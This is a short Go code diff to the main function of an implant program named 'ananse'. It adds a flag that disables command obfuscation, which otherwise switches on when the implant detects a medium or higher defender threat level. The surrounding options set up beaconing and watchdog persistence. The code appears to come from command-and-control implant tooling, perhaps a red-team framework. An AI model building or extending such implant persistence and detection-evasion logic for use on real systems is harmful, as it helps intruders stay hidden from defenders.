@@ -32,6 +32,7 @@ func main() {
 	implantID := flag.String("id", "", "Implant ID (auto-generated if empty)")
 	interval := flag.Int64("interval", 60000, "Base beacon interval in ms")
 	noPersistence := flag.Bool("no-persist", false, "Skip watchdog persistence install")
+	noObfuscate := flag.Bool("no-obfuscate", false, "Disable command obfuscation")
 	flag.Parse()
 
 	if *token == "" {
@@ -60,7 +61,7 @@ func main() {
 	}
 
 	// Enable command obfuscation for medium+ threat
-	if threatLevel == "medium" || threatLevel == "high" || threatLevel == "critical" {
+	if !*noObfuscate && (threatLevel == "medium" || threatLevel == "high" || threatLevel == "critical") {
 		shell.CommandObfuscate = true
 		fmt.Printf("[ananse] command obfuscation enabled (threat: %s)\n", threatLevel)
 	}
@@ -131,7 +132,7 @@ func main() {
 			lastProfile = time.Now()
 
 			// Update command obfuscation based on latest threat
-			if prof != nil && (prof.ThreatLevel == "medium" || prof.ThreatLevel == "high" || prof.ThreatLevel == "critical") {
+			if !*noObfuscate && prof != nil && (prof.ThreatLevel == "medium" || prof.ThreatLevel == "high" || prof.ThreatLevel == "critical") {
 				shell.CommandObfuscate = true
 			}
 		}
